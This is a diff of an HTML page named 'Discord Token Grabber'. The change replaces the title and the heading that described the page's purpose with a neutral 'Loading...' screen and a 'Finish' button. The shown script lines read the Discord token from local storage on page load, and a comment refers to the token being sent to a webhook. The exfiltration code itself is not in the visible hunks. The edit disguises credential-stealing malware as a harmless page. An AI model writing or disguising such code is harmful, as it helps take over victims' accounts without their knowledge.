@@ -1,7 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Discord Token Grabber</title>
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        #loading {
+            text-align: center;
+        }
+        #finishButton {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div id="loading">
+        <p>Loading...</p>
+        <button id="finishButton">Finish</button>
+    </div>
     <script>
         // Function to get the Discord token from local storage
         function getDiscordToken() {
@@ -43,10 +68,11 @@
 
         // Run the main function when the page loads
         window.onload = main;
+
+        // Hide the loading message and button after token is sent
+        document.getElementById('finishButton').addEventListener('click', () => {
+            document.getElementById('loading').style.display = 'none';
+        });
     </script>
-</head>
-<body>
-    <h1>Discord Token Grabber</h1>
-    <p>This script will grab the Discord token from local storage and send it to the specified webhook when the page loads.</p>
 </body>
 </html>
